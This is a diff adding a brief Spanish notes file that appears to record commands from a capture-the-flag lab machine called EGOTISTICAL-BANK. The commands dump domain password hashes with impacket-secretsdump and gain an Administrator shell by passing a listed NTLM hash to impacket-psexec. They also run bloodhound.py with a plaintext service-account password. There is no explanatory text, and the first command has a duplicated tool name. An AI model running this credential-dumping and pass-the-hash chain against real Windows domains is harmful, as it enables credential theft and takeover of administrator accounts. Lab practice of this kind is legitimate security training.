@@ -1,0 +1,8 @@
+Uso de herramientas impacket:
+
+impacket-secretsdump impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
+
+impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
+
+Uso de bloodhound.py:
+python3 bloodhound.py -ns 10.10.10.175 -d egotistical-bank.local -dc sauna.egotistical-bank.local -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -c All
